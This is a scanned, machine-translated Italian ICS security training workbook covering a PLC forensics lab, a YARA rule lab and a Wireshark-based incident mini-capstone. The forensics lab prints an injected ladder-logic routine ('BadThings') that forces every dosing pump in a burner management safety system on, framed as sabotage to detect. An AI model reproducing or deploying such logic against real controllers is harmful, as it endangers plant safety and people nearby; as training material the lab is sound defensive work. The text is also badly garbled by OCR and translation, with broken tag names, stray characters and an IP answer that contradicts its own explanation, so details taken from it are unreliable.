_ BurnerManagementinfected.L5K 01/08/2021 15:41 Logix Designer Im...

ey Ca\Users\sansics\Desktop\ Student Files\calistogarefinery\BurnerManagement.L5K - Blocco note++

File Modifica Cerca Visualizza Codifica Impostazioni lingua Strumenti Macro Esegui finestra plugin ?
SSH. ea|*¢hh| Sel me(aalB

i aE IRR

fe] BumerManagement.L5K £9

a ©®|2 ORB eB

(AR RE RARER RRR RRR R RE ER EKER RKB ERE ERERR RARER ERE

Import-Export
Versione i= R5Logix 5000 v16.04

Imo ww

Proprietario Dragos Inc.
Esportato := gio 16 luglio 11:08:36 2020
FOCUS CIO IIA II IOI RIOR IY
2 IE_VER := 2.7;
CONTROLLER Burner_Management_Safety System (Descrizione:= "Sistema di sicurezza gestione bruciatore",
Tipo processore := "1756-L55",
Maggiore:= 16,
Intervallo di tempo:= 20,
CondividiUnusedTimeSlice := 1,
PercorsoComm := "AB ETHIP-3\10.10.20.10\Backplane\o",
Ridondanza abilitata:= 0,
KeepTestEditsOnSwitchOver := 0,
DataTablePadPercentuale:= 50,
Codice di sicurezza:= 6,
SFCExecutionControl := "“CurrentActive",
SFCRestartPosition "Più recente",
SFCLastScan := "Non scansionare",
Numero di serie := 16#0019 cli4,
MatchProjectToController := No,
Inibisci aggiornamento firmware automatico:= 0)
MODULO Locale (Genitore := "Locale",

ParentModPortid := 1,

Numerocatalogo := "1756-L55",

Venditore := 1,

*Nota* Ogni file di progetto è diverso e non tutti gli OEM supportano l'esportazione del file come file di testo leggibile.
Rockwell tende a farlo e quindi possiamo visualizzare il file di progetto in Notepad ++

*Nota* Sarebbe molto utile incontrare un ingegnere per illustrare cosa sta realmente accadendo sul

sistema ma fortunatamente ci sono alcuni ottimi commenti e descrizioni su questa sicurezza di gestione del bruciatore
File logico di sistema da esaminare.

© 2021, Robert M. Lee Lab 5.1-3
*Nota* Come esempio vediamo che i valori DP1 — DP25 sono relativi alla pompa dosatrice. I valori che vediamo sono
identici a quelli che abbiamo visto in precedenza nel corso nel traffico di rete; questi sono i tag associati a
valori che fanno parte del ciclo di controllo.

AG
DP1 OF Locali:2:0.Data.1 (Descrizione := "Pompa dosatrice 1",
RADICE := Decimale);
DP1LO OF Locale:2:0.Dati.10 (Descrizione:= "Pompa dosatrice 10",
RADICE := Decimale);
Livello DPiG : DINT (RADIX := Decimale) := G;
DPl0Running : BOOL (Descrizione:= "Stato di funzionamento pompa dosatrice 10",
RADICE := Decimale) := 0;
DPidStart: BOOL (Descrizione:= "Avvia dose temporizzata per DP10",
RADICE := Decimale) := 0;
DPi0Time OF DP1lOTimer.PRE (RADIX := Decimale);
DPi0dTimeDelay OF DP10TimerDelay.PRE (RADIX:= Decimale);
DPi0Timer : TIMER (Descrizione := "Timer per pompa dosatrice 10") := [0,0,0];
DPi0TimerDelay : TIMER (Descrizione:= "Ritardo timer per pompa dosatrice i0") := [9,0,0];
DPil OF Local:2:0.Data.11 (Descrizione:= "Pompa dosatrice 11",
RADICE := Decimale);
Livello DPii : DINT (RADIX := Decimale) := 5;
DPiiRunning : BOOL (Descrizione:= “Stato di funzionamento pompa dosatrice 11",
RADICE := Decimale) := G;

*Nota* Se non hai dimestichezza con le pompe dosatrici potresti parlare con un operatore dell'ambiente oppure qui da te
potrebbe Google le informazioni. Per brevità, una pompa dosatrice è una pompa per la portata precisa di un prodotto chimico o
sostanza in altri flussi di fluidi come acqua o gas. Possono essere utilizzati per pompare sostanze chimiche da un serbatoio
il processo di una reazione chimica come esempio. In questo ambiente sono importanti per il bruciatore e
causare modifiche alle pompe dosatrici porterebbe probabilmente a un valore catastrofico se modificato troppo drasticamente nel
processo fisico.

Pl OF Local:2:0.Data.16 (Descrizione:= "Pompa i",
RADICE := Decimale);

P10 OF Locai:2:0.Data.25 (Descrizione := "Pompa 10",
RADICE := Decimale);

Livello PlOL : DINT (RADIX := Decimale} := 50;

PlGRunning : BOOL (Descrizione:= "Stato di funzionamento pompa 10",
RADICE := Decimale} := 9;

PlOStart : BOOL (Descrizione:= "Avvia dose temporizzata per P10",
RADICE := Decimale) := @;

Pl0Time OF P10Timer.PRE (RADIX := Decimale);

PlOTimeDelay OF Pl0TimerDelay.PRE (RADIX := Decimale);

*Risposta* Vediamo anche che i valori P sono in uso nella logica e sono correlati allo stato delle pompe. Il principale
La funzione di questo file logico sia sui valori DP che sui valori P è per le pompe correlate al bruciatore
Processo di gestione.

© 2021, Robert M. Lee Lab 5.1-4

a we@, @@@@ ® fl*

>>»? Omrnmnmnennmm7®®

ww

E)

noi WD

ap

2. Qual è la routine dannosa?

Routine delle cose brutte

> Utilizzando il menu Plugin, seleziona il menu a tendina Confronta e fai clic su Confronta i due file

> Aprire il file BurnerManagementinfected.L5K
> Fai clic su Plugin > Confronta > Confronta
> Identificare i cambiamenti

[Lf CAUsers\sansics\Desktop\Student Files\calistogarefinery\BurnerManagementinfected.L5k - Blocco note++

ile Modifica Cerca Visualizza Codifica Impostazioni lingua Strumenti Macro Esegui finestra plugin 7
s2HG 28a ¢4¢ 8 OH Oc¢ mee e|BR Confronta >
Strumenti MIME x
[APARNA PR ERODATHOEE ARPA EAN REEREONERROEEERERERE Convertitore >
2 NppEsportazione >
Import-Export
4 Versione RSLogix 5000 v16é.04 Amministrazione plugin...

Dragos Inc.
Apri la cartella dei plugin...

Imposta come primo da confrontare
Confrontare
Cancella confronto attivo

Cancella tutti i confronti

Differenza dall'ultimo salvataggio
Differenza SVN
Git Diff

Ignora gli spazi

Ctri+Alt+1
Ctri+Alt+C
Ctri+Alt+X
Ctri+Alt+Maiusc+X

Ctri-Alt+D
Ctrl+Alt+V
Ctri+Alt+G

*Nota* Verrà visualizzato un confronto affiancato di entrambi i file CSV. Scorrendo le differenze,

vedrai le aree evidenziate in cui si sono verificati i cambiamenti.

Flmetanagenere 15K 3

eae InizioTimerDrink:
leas RADIX
GesùEND_TAG

BOOL (Descrizione:= "Avvia il timer delle bevande a
:= Decimale) := 07

PROGRAMMAProgrammaMain (MAIN := "MainRo}
MODALITÀ:= 0,

Bandiera Disabie := 9)

TAG TAS

:= Decimale)

END_TAG END_TAG

Cose brutte di ROUTINE Cose brutte di ROUTINE

4 SSE ESG SE

END_ROUTINE END_ROUTINE

erDrinkStart +

kaboom:

1°) BumerManagementinected L5K E3

BOOL (Descrizione:= “Avvia il timer delle bevande ~
RADICE := Decimale) :

BOOL (Descrizione:

Decimale)
2 DINT (Descrizione
RADICE := Decimale)

+ OTE (kaboom) ;
= XIC (kaboom) OTE (DP1Start) :
¢ XIC (kaboom) OTE (DP2St
: XIC (kaboom) OTE (DP3Star!
i: XIC (ic
¢ XIC (Jab
+ XIC (kaboom) OTE (DPéStar'
: XIC (kaboom) OTE (DF7Star'
+ XIC (kaboom) OTE (DFSStar
1 XIC (kaboom) OTE (DP9Star'
: XIC (kaboom) OTE (DI
: XIC (kaboom) OTE (DF1
: XIC (kaboom) OTE (DF125
+ XIC (kaboom) OTE (DP13Sta:

) OTE (DP4St.
m) OTE (DPSStar!

taggami",

ce Etichetta 2",

*Nota* L'ovvia aggiunta è il tag "kaboom" e le informazioni associate alla routine "BadThings".

(avviso spoiler: non è così ben chiamato negli incidenti della vita reale).

*Risposta* Routine delle cose brutte

© 2021, Robert M. Lee

Laboratorio 5.1-5
3.Cosa sta accadendo nella logica?

Un circuito forzato sulle pompe dosatrici

kaboom : BOOL (Descrizione:= “niente da vedere qui",
RADICE := Decimale) := 0;
Test_Tag : DINT (Descrizione := "Test Tag 1",
RADICE := Decimale) := 0;
Test_Tag 2 DINT (Descrizione := "Test Tag 2",
RADICE := Decimale) '*= 0; ;
FINE_TAG

ROUTINE Cose brutte

: OTE (kaboom) ;

: XIC(kaboom) OTE (DP1Start) ;
: XIC(kaboom) OTE (DP2Start) ;
XIC (kaboom) OTE (DP3Start);
XIC (kaboom) OTE (DP4Start);
XIC (kaboom) OTE (DP5Start);
: XIC (kaboom) OTE (DPéStart) ;
: XIC(kaboom) OTE (DP75tart) >;
: XIC(kaboom) OTE (DPSStart);
: XIC(kaboom) OTE (DP9Start) ;
: XIC(kaboom) OTE (DP10Start) ;
: XIC(kaboom) OTE (DP1iStart) ;
: XIC(kaboom) OTE (DP12Start);
: XIC (kaboom) OTE (DP13Start) ;

22zaaz2azaazaaaazaaaaae

*Risposta* In molti casi di logica ladder l'istruzione XIC (Esamina se chiuso) è un'istruzione fondamentale
utilizzato nella programmazione dei PLC. L'istruzione XIC controlla se il bit specifico è in uno stato logico ALTO. Se questo è
vero, il resto della logica continuerà a funzionare. L'istruzione OTE è nota come istruzione Output Energize.
L'istruzione OTE energizzerà un singolo bit di dati se l'input che la conduce è vero. Quindi, insieme, questo
la logica garantisce che il tag "kaboom" sia sempre impostato su alto. Valuta e forza diversi valori DP
rimanere sempre acceso forzando il sistema di gestione del bruciatore a funzionare sempre a pieno regime. Ciò probabilmente porterebbe a a
incidente di sicurezza che dipende da una serie di variabili fisiche, di processo e di controllo della struttura. È molto
ovviamente, date le informazioni di cui disponiamo, è evidente la causa principale di ciò che è accaduto nella nostra raffineria.

© 2021, Robert M. Lee

Laboratorio 5.1-6

=

“) (@) (@) (2) (Per (=) [“) =) “=

M@") @) ")

wn®

TD®®
Lab 5.2 — Regole YARA

' |Obiettivi
e Identificare gli indicatori rapidi negli esempi di malware
e Sviluppare una regola YARA per gli indicatori

*Informazioni sullo scenario* Abbiamo concluso l'indagine ma vogliamo creare alcune semplici regole YARA per farlo
analizzare rapidamente i sistemi in tutta la nostra organizzazione per garantire di avere l'intero ambito dell'indagine per il
lavori di pulizia che inizieranno a breve.

<s

<<»

Questo esercizio utilizzerà la tua VM RELICS e il malware in ics515 > calistogarefinery > malware >
F) cartella malware2

1. Quali sono alcuni buoni indicatori dalle stringhe di malware dei seguenti file?

Esempi di malware:

beacon.exe

= flexsvr.exe

“dlRSLINX.exe
FTActivationBoost.exe

vwVai @&

UN

© 2021, Robert M. Lee Lab 5.2-1

sì

au
2.

Usando YARA quali di queste stringhe si trovano in engwrkstn_memdump.mem e
file di memoria viewdesigner_memdump.mem?

© 2021, Robert M. Lee

Laboratorio 5.2-2
wD ww Ww Ww Ww

wp

qs

Compito: creare indicatori dalle stringhe del malware

1. Quali sono alcuni buoni indicatori dalle stringhe di malware dei seguenti file?
Esempi di malware:
beacon.exe
flexsvr.exe
RSLINX.exe
FTActivationBoost.exe

beacon.exe

emulatore cip hmi_

__cip_ple_time
pitone

_cip ple informazioni _

> Avvia la tua VM RELICS

> Accedi alla VM
> ACCEDI =reliquie
> PASSWORD = reliquie

> Passare alla cartella malware?2 per Calistoga Refinery
> Apri un terminale
> Eseguire il seguente comando nel terminale:
cd /home/relics/Desktop/ics515/calistogarefinery/malware/malware2

> Esegui Strings rispetto ai quattro campioni di malware designati e identifica le stringhe che potrebbero essere utili
indicatori

> Nel Terminale su ogni file esegui il comando Strings. Esempio:
stringhe beacon.exe

*Nota* Se per te è più semplice, genera il contenuto in un file di testo aggiungendo "> name.txt" al comando o esegui
il comando “strings beacon.exe | less" e utilizzare la barra spaziatrice per avanzare nell'output

© 2021, Robert M. Lee Lab 5.2-3
UN

6
Beacon.exe: 6
_dllonexit
etmainargs¢
_initenv
_lconv_init
set_app_type _
_setusermatherr Ly
accmdin.
esci -
fmode e
intern
iob
serratura '

sbloccare
vinceremaggiore.

KERNEL32.d1L
svcrt.dll

*Nota* Non c'è nulla che risalti realmente su beacon.exe, potresti trasformarne alcuni in indicatori tranne che per questo file
utilizzeremo semplicemente il nome del file stesso come indicatore, ad esempio beacon.exe

FTActivationBoost.exe:

-xmllettore)

oeaeeeje#s oo om

diavolo

eo a

buunicodedata.pyd
nome file manifest cip_hmi_emulator.exe.manifest
srary.zip

-pyz
#python37.dtl

© 2021, Robert M. Lee Lab 5.2-4

su a

Sono

Ww WwW Ww WW

w

a WwW Uy wy Ww Ww

qs

*Nota* Ci sono alcune ottime opzioni in questo file. Potresti scegliere una serie di cose come "python" come quella
sarebbe estremamente anomalo su una stazione operatore ma sceglieremo “cip_hmi_emulator” come indicatore.

RSLINX.exe:

plc_information.exe.manifest
rypto-1_1.d1l

nome file manifest cip_plc_information.exe
se_libreria zip
piz
thon37.dt1

*Nota* Ancora una volta molte ottime scelte qui e c'è un tema sull'utilizzo di Python in queste famiglie di malware. BENE
concentrati però su “cip_plc_information”.

Flexsvr.exe:
Bpyiboot01_ bootstrap

Lect.pyd
icodata.pyd

spython37.dl

*Nota* L'indicatore "cip_plc_time" sarà valido da questo file (tutto questo è soggettivo e potresti
scegliere un'ampia varietà di articoli).

*Rispondi* cip_plc_time, cip_plc_information, cip_hmi_emulator, beacon.exe e includeremo python
perché è successo così tante volte.

© 2021, Robert M. Lee Lab 5.2-5
Compito ~ Sviluppare una regola YARA per gli indicatori

2. Utilizzando YARA quali di queste stringhe si trovano in engwrkstn_memdump.mem e
file di memoria viewdesigner_memdump.mem?

beacon.exe

pitone

> Crea una regola YARA utilizzando gli indicatori
> Aprire l'editor di testo nella barra degli strumenti nella parte inferiore di RELICS VM
> Crea una regola YARA per soddisfare quanto riportato di seguito sfruttando gli indicatori che abbiamo appena trovato
o Utilizzerai i parametri "wide" e "nocase" per cercare le lettere separate
più byte che è comune vedere nei file di memoria e garantire la distinzione tra maiuscole e minuscole non lo fa
questione

1 regola calistogarefinery

2{

3 corde:

ce) Sal = “cip_plc_time" nocase wide

5 Sa2 = "beacon.exe" nessun caso di larghezza

6 $a3 = "python" nocase largo

7 $a4 = "cip_hmi_emulator" nocase wide
8 $a5 = “cip_plc_information" in nessun caso
9
10 condizione:
11 1 di loro
12}

> Salvare il file nella cartella di memoria
> Salvare il file nella cartella ics515>calistogarefinery>memoria

René Calistogarefinery

reliquie (]Desktop ics515_—calistogarefinery memory +

> Esegui la regola YARA sulle immagini di memoria di ViewDesigner e EngWorkstation
> Esegui il seguente comando
yara -s calistogarefinery engwrkstn_memdump.mem > eng.txt

© 2021, Robert M. Lee Lab 5.2-6

(@)

ehi

@)

oP ® & @ @® @ @ @ @ © ® © OO ® © ® OD

w

Vw8 i

noi8

> Esegui il seguente comando
yara -s calistogarefinery viewdesigner_memdump.mem > hmi.txt
> Controlla i file di output aprendoli

yara -s calistogarefinery engwrkstn_memdump.mem > ing. TXT

$ yara -s calistogarefinery viewdesigner_memdump.mem > hmi.txt

z raffineria pacittege engwrkstn_memdump.mem

2 Ox62bba2c:$a2: b\xO00e\x00a\x00c\x000\x0On\ x00. \x0e\x00x\x00e\x00
3 Ox707b88e:$a2: b\x00e\x00a\x00c\xO00\x0On\ x00. \xOBe\x0Ox\x00e\x00
4 Ox707cfT6:$a2: b\x00e\x00a\x00c\x000\x00n\x00. \xO0e\x00x\xd0e\x00
5 0x70c388e:$a2: b\x00e\x00a\x00c\x000\x00n\x00. \x00e\x0Ox\x00e\x00
6 0x70c4e96:$a2: b\x00e\x00a\x00c\x000\x0On\x00. \xO0e\x0Ox\xO0e\xO0
7 0x70c6156:$a2: b\x00e\x00a\x00c\x000\x00n\x00. \x0Ge\x00x\x00e\x00
8 0x710e88e:$a2: b\x00e\x00a\x00c\x000\x00n\x00. \xO0e \x00x\x00e\x00
9 ®x712b88e:$a2: b\xO0e\xd0a\x00c\xO00\ xOOn\ xOO. \xOGe\xOOx\x00eE\x00
10 0x7840f74:$a2: b\x00e\x00a\x00c\x000\x00n\x00. \xOBe\x00x\x09e\x00
11 0x808619a:$a2: b\x00e\x00a\x00c\x000\x00n\x00. \x00e\x00x\x00e\x00
12 0x8389482:$a2: B\xQOE\x00A\x00C\x000\xOON\x00. \xOOE\x00X\xO0E\x00

*Nota* Ricerca widecase su più byte in memoria per i valori. Qui vediamo nello screenshot
"beacon.exe" è scritto. b\x00 e\x00 a\x00 c\x00 o\x00 n\x00 e così via. Vediamo i seguenti valori in
il file di testo: beacon.exe e python.

*Risposta* Anche se ci sono molti più risultati nel file HMI, la risposta è sempre la stessa, beacon.exe e python. Noi
potremmo trovare altri indicatori di valore, ma questi due sembrano essere i più coerenti e probabili quelli che troveremmo
vogliamo utilizzare per definire l'ambito dei nostri sistemi in tutta l'organizzazione per una rapida ricerca di indicatori per assicurarci
comprendere l'intera portata dell'indagine.

© 2021, Robert M. Lee Lab 5.2-7
ww w ww ww w Ww w ww Ww WwW LW Ww ww 1w ww ww = er _-_

Ww

_ Giorno 5 - Mini Capstone — Calistoga Rai

e Acquisire maggiore familiarità con gli strumenti principali evidenziati nella lezione
e Acquisire familiarità con ulteriori tipi di minacce

*Informazioni sullo scenario* Sei un consulente che è stato assunto per valutare la rete di una piccola struttura ICS.
Il personale del sito ha raccolto alcuni pacchetti catturati da esaminare. Utilizzando i concetti di
Ciclo di difesa informatica attiva, familiarizzerai con la rete e quindi cercherai un file. Una volta che hai
potenzialmente identificata una minaccia, si tenterà di scoprire informazioni su di essa e sul sistema interessato. IL
il personale in loco ha messo a tua disposizione una linea di base apparentemente pulita, AnalysisSession3, con cui iniziare. Se
la tua risposta all'incidente scopre qualcosa, dovrai eseguire alcune analisi di base sulle capacità di
la minaccia. Sebbene non sia disponibile alcuna Threat Intelligence sulle potenziali minacce, è importante
devi considerare che se viene scoperta una minaccia, come e cosa condivideresti con i tuoi colleghi nel
Comunità.

Preparazione agli esercizi

Puoi utilizzare qualsiasi strumento, macchina virtuale o risorsa a tua disposizione per completare il mini-capstone del giorno 5
scenario. Wireshark e Redline verranno utilizzati nella procedura dettagliata come un approccio che è possibile adottare. I dati
per l'esercizio si trova in RELICS e Windows VM nella cartella Calistoga Rail.*Nota* Le seguenti domande riguardano Capture 4:

Di chi è l'iPhone in rete?

Quali protocolli ICS sono presenti sulla rete?
Qual è l'indirizzo IP dei due HMI?
Quanti client Modbus TCP esistono?

P@NP

*Nota* Le seguenti domande riguardano Capture 5:

Qual era il referrer per il firmware Phoenix Contact Download?
Quale file zip è associato al firmware?

Quale eseguibile c'è nel traffico?

Da quale indirizzo IP ha avuto origine l'eseguibile?

SN AH

*Nota* Le seguenti domande riguardano Capture 6:
© 2021, Robert M. Lee ICS515 Mini-Capstone del quinto giorno 1
9.

Qual è il file zip nel traffico?

*Nota* Le seguenti domande riguardano Capture 7:

10.
11.
12.
13.
14.

Quale strano traffico di rete si sta verificando?

Quali dispositivi di controllo vengono presi di mira?

Ci sono file strani che potrebbero essere correlati a questo traffico?

Quale utente è associato allo strano traffico?
Quale indirizzo IP è associato al file dispari?

*Nota* Le seguenti domande riguardano AnalysisSession3:

15.
16.
17.
18.
19.

Quali sono i due indirizzi IPv4 per il computer ripreso?

Da quale posizione/cartella è stato eseguito "0001.bat"?

Quale programma dannoso (file zip) è stato scaricato e utilizzato?
Dove potrebbe trovarsi il file nascosto?
Questa attività è correlata all'attività di rete?

*Nota* Le seguenti domande riguardano AnalysisSession4:

20.
21.
22.
23.

*Nota* Le seguenti domande richiederanno una ricerca open source/ricerca su Internet:

24.
25.
26.
27.
28.

Quale file potenzialmente dannoso è stato eseguito da “In Gary”?
"In Gary" era un amministratore?

Quando è stato creato lo script dalle acquisizioni di rete sul sistema?
Qual è l'hash MD5 dello script?

In quale repository di codice è possibile trovare lo script dannoso?

Lo script può semplicemente leggere i registri o anche scrivervi?

L'uso dello script (per la sua configurazione) sembrava mirato?

È stato probabilmente il lavoro di una minaccia esterna o interna?

Che tipo di informazioni potrebbero essere condivise per aiutare la comunità?

© 2021, Robert M. Lee 1CS515 Mini-Capstone del quinto giorno

2 ® BAB BA BD * 2)

(@)

@)

eh. ae oe oe,

o

ohm

oO
Ww WwW WW WW WW VY Vy wr wwe

Ww

wow Ww

©

Domande: con procedura dettagliata

*Nota* Le seguenti domande riguardano Capture 4:

Capture 4 è un'acquisizione di base della rete ICS interna.

1.

Di chi è l'iPhone in rete? Tom

Un modo per cercare i dispositivi BYOD è cercare le stringhe comuni ad essi associate. In Wireshark, tu
puoi scegliere Trova pacchetto sotto Modifica e cercare la stringa "telefono".

File Modifica Visualizza Vai Cattura Analizza Statistiche Tel

copia

© Trova pacchetto... <err

Trova il prossimo
Trova precedente

4 Wireshark Trova pacchetto —
Lui è -

| Autore: ©) Installatore del display © Valore esadecimale @ Sting —

Ecce | telefono -_

=| _ Direzione: 7

; Cerca nel ; Opzioni stringa

| @ Elenco pacchetti Con distinzione tra maiuscole e minuscole | ©Su

| © Dettagli del pacchetto | | Larghezza carattere: |® Giù
| © Byte del pacchetto | [Stretto ampio

r SSIES OT : r z es ]
bint [trova] [cence |

Nel pacchetto evidenziato possiamo vedere che l'iPhone di Tom era connesso.

un Toms-iPhone-4, locale: digitare ANY, classe IN, domanda "QM".
Nome: Toms-iPhone-4. Locale
[Lunghezza nome: 19]

[Conteggio etichette: 2]

& (Una reazione eet

va bene. ecorc oho carvar feache hac disponibile

Tyna:

6d e2 80 99 73 20 69 50 68 6f be 65 Oc 5f 64 65

Ross

Senza cercare “telefono”, però, uno dei metodi più affidabili è visualizzare gli indirizzi MAC
in Wireshark > Endpoint e cerca fornitori comuni come Apple.

© 2021, Robert M. Lee 1CS515 Mini-Capstone 3 del quinto giorno
2. Quali protocolli ICS sono presenti sulla rete? ModBus TCP e OPC

Per cercare i protocolli per i quali Wireshark probabilmente dispone di dissettori, è utile cercare in Gerarchia dei protocolli.

File Modifica Visualizza Vai Cattura Statistiche anali Strumenti di telefonia Intern
©O4m a ate 1B Riepilogo
Riepilogo dei commenti

Filtro:

Mostra la risoluzione dell'indirizzo
0, Time ee dl Gerarchia del protocollo

Siamo un ee ee

AZ 611 NE7EIA 1 FE 33 © Ho}

In questo caso vediamo Modbus TCP e Ambiente di calcolo distribuito/Chiamata di procedura remota
(DCE/RPC). Wireshark non ha un dissettore OPC, quindi qui visualizza OPC come DCE/RPC perché OPC è
un protocollo basato su DCOM. Non sappiamo con certezza se DCE/RPC sia effettivamente OPC in questo momento ma, in un ICS
ambiente, questa è una buona cosa da cercare; inoltre, possiamo cercare la stringa "OPC".
intuisco e scopro che c'è un server MatrikonOPC sulla rete.

3. Quali sono gli indirizzi IP dei due HMl? 25.10.22.100 e 25.10.22.103

Utilizzando Statistiche > Conversazioni in Wireshark, possiamo vedere che sia 10.25.22.100 che 10.25.22.103 sono
parlare con i dispositivi di controllo (quelli che utilizzano Modbus TCP). Non possiamo semplicemente escludere l'indirizzo IP
utilizzando OPC perché anche il server SCADA potrebbe avere un server OPC. In questo caso, possiamo
filtrare fino ai due indirizzi IP. Ma solo questi due indirizzi IP non ci diranno molto; vogliamo usare
altre comunicazioni che potrebbero essere presenti sulla rete, come il servizio dei nomi netBIOS di Windows. Quindi, uno
Il metodo consiste nel filtrare fino ai due indirizzi IP e al servizio dei nomi netBIOS, che è rappresentato in
Wireshark come nbns.4 Cattura 4.pcapng_ [Wireshar
File Modifica Visualizza Vai Acquisisci Analizza Statistiche Strumenti di telefonia Componenti interni Guida

©O4BAZ\/SBSExX2 Qe ev aTFsi (SB Qaaal wsesx B

Filtro: {ip.addr==10.25.22.100 || ip.addr==10.25.22.103) && nbns —" Espressione... Cancella Applica Salva

N. Ora Sorgente Destinazione Protocollo Lunghezza Info
11925 118. 71196110. 25.22.100 20°25. 22-255 NBNS 92 Interrogazione nome NB TOM-WORK<20>
11928 118. 712802 10. 25. 22.200 10. 25.22.100 NBNS 122 Nome risposta interrogazione NB 10.25.22.200
30113 288.153375 10.25.22.100 16.25522,255 NBNS inet VTSCADA<1c>
30207 288. 90319510. 25. 22.100 10.25.22.255 NBNS me interroga NB VTSCADA<ic>

Da qui vediamo che 10.25.22.100 si identifica come server VISCADA. Guardando attraverso il traffico,
vediamo anche che anche 10.25.22.103 fa lo stesso. Anche 10.25.22.100 si identifica successivamente come SCADA2. Questo
la rete dispone quindi di due server HMI. Troverai attivo anche 10.25.22.101 ma sta solo facendo
Legge le richieste e non è contrassegnato nella stessa convenzione di denominazione nelle query sui nomi degli HMI. Mentre
più difficile da determinare, potremmo determinare che si tratta probabilmente di uno storico e non di un HMI. Se includi tutto
tre risposte va bene, ma in realtà solo .100 e .103 sono gli HMI.

4. Quanti client Modbus TCP esistono? quattro

© 2021, Robert M. Lee ICS515 Mini-Capstone 4 del quinto giorno

(®) (@>

(®)

io&&©©

®
w Ww Ww ww ww Tw Tw Tw wy Tw yw Ww

sì, sì

“uF

Ay

ww a wy ay

w

Possiamo creare un filtro per Modbus TCP (digitare mbtcp nella casella Filtro e fare clic su Applica). Quindi fare clic su
Endpoint, ma nella parte inferiore della casella fare clic su "Limita per visualizzare il filtro" in modo che vengano visualizzati solo i dispositivi in ​​uso
visualizzati dal nostro filtro vengono conteggiati. Ci sono quindi quattro client su cui esegue il polling i server SCADA. Sono
10.25.22.3, 10.25.22.5, 10.25.22.6 e 10.25.22.8.

*Nota* Le seguenti domande riguardano Capture 5:

Capture 5 si trova nella DMZ da cui è possibile accedere a Internet. È stato catturato per te dal sito
personale.

5. Qual era il riferimento per il firmware Phoenix Contact Download? _http://firmwaregratuito/download

Quando si apre questa acquisizione di pacchetti, è subito ovvio che c'è qualcosa di più del semplice sistema di controllo
comunicazione in corso: in questo caso è presente traffico Web HTTP. Per vedere cosa sta succedendo, possiamo selezionare il file
primo traffico HTTP che vediamo (o filtriamo su HTTP) che è il pacchetto numero 16. Facendo clic con il tasto destro e
selezionando Segui flusso TCP, possiamo vedere cosa sta succedendo.

583 OTTIENI /downloads/Phoenixcq SIEM
60 [Aggiornamento finestra TCP] 80-4 Contrassegna pacchetto (attiva/disattiva)
60 8049250 [ACK] Seq=1 Ack _ |gnore Pacchetto (attiva/disattiva)

71 [Segmento TcP di una risposta¢ © Imposta riferimento temporale (attiva/disattiva)
p35 HTTP/1.0 200 OK (testo/H © TimeShift...

60 49250-80 [ACK] Seq=530 4

60 49250-80 [FIN, ACK] Pacchetto modifica sequenza

i Commento pacchetto...

60 80-49250 [ACK] Seq=900 4
82 Porta di origine: 49152 Dest

Risolvi manualmente l'indirizzo

Applica come filtro

| Preparare un filtro
sull'interfaccia 0 | Filtro di conversazione
:84:b1 (00:30:44:06:84:ba) | Colora Conve: n
A, 2.2 :(20.24..2)
pettorali (ite! Ba | oceano

un un un

+

SCTP
Segui il flusso TCP

A Segui flusso TCP (tcp.stream eq 0)

Contenuto in streaming =

OTTIENI /downloads/Phoenixcontact-Download_2014~12-30_14-44-27/ HTTP/1.1 . _
Accetta: ede Me ee a bo jmage/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, */*
Riferimento: http 7/#rect irmat e/down 103d / -ijemmnmesamememesnem

| Accetta lingua: en-US

Agente utente: Mozilla/4.0 (compatibile; MSIE 7.0; windows NT 6.1; win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR
3.5.30729; CLR .NET 3,0.30729; PC Media Center 6.0)

CPU UA: AMD64

Codifica accettata: gzip, deflate

Host: firmware gratuito

connessione: Keep-Alive

Il referrer per questa sessione era http://freefirmware/downloads che è immediatamente un brutto segno da vedere.
Gli aggiornamenti del firmware dovrebbero provenire solo da fonti di fornitori approvati.

6. Quale file zip è associato al firmware? AX SW SUITE 1.81 AddOn vi.zip _

© 2021, Robert M. Lee ICS515 Mini-Capstone 5 del quinto giorno
Nello stesso flusso TCP dell'ultima sessione, vediamo che il contenuto è tornato dalla richiesta GET
incluso un file zip e un eseguibile. Esiste una versione 1 e 2 di entrambi i file.

7. Quale eseguibile è presente nel traffico?

AX SW SUITE 1.81 AddOn V1.exe

Possiamo vedere l'eseguibile anche nella posizione della domanda precedente; tuttavia, un altro modo affidabile per
vedere i file passati per sessioni non crittografate è andare su File > Esporta oggetti > HTTP.

Esporta pacchetti specificati...
Esportare dissezioni di pacchetti
Esporta pacchetto selezionato per byt
Esporta PDU su file...
! Esporta sessione SSL
Esporta oggetti

& Stampa...

Qpen... Ctrl+O >pt &
Aperto di recente "
Unisci...:
Importa da Hex Dump... Destinazione
| 9€ Chiudi Ctrl+W FFO2: ic

® Salva Ctl+S BTFO2Z::c

7) Salva con nome... Shift+Ctrl+$ altro
Insieme di file

L'eseguibile è lì ed è grande 40 MB. Sarebbe bene salvarlo per la Minaccia e l’Ambiente
Gente, la manipolazione la esamineremo più tardi. Ciò però esula dall'ambito di questo scenario.

8. Da quale indirizzo IP ha avuto origine l'eseguibile?

10.1.1.2

L'indirizzo IP associato al traffico HTTP è 10.1.1.2; questo è interessante perché è un IP interno

indirizzo e ogni sessione avviene tramite quell'indirizzo IP. Pertanto, è probabile che si tratti di un proxy utilizzato internamente

alla rete. I proxy sono un'ottima fonte di registri e prove forensi, inclusi i timestamp di

sessioni richieste.

*Nota* Le seguenti domande riguardano Capture 6:

Rendendoti conto che probabilmente nella rete entrano alcuni file strani o potenzialmente dannosi, chiedi al sito

personale per catturare un'altra zona demilitarizzata. Questo ti fornirà le informazioni più recenti da ciò che è

succedendo in rete.

9. Qual è il file zip nel traffico?

© 2021, Robert M. Lee

IP EtherNet reso semplice.zip

1CS515 Mini-Capstone del quinto giorno 6

eyBf®oO

aoeoene @

uno

’

fa,
Ay

O24

ww

Ww Ww a ay ay ay ay ay w

Poiché Capture 6 ha anche traffico HTTP, possiamo nuovamente andare su File > Esporta oggetti > HTTP e vedere se c'è qualcosa
viene fuori. In questo caso, vediamo il file zip “EtherNet_IP_Made_Easy.zip” dello stesso firmware gratuito
sito web come gli altri file zip. È probabile che un tecnico della rete stia tentando di aggiornare il firmware di a
dispositivo o ottenere aiuto e ha semplicemente fatto delle scelte sbagliate su dove andare.

*Nota* Le seguenti domande riguardano Capture 7:

I file osservati nella DMZ sono molto probabilmente destinati alla zona ICS interna a causa della rilevanza del file
file per controllare i dispositivi. Chiedete quindi al personale del sito di effettuare una cattura della zona ICS interna in modo che voi
può avere le informazioni più recenti. Hanno riferito che si stanno verificando strane attività con l'ICS.

10.

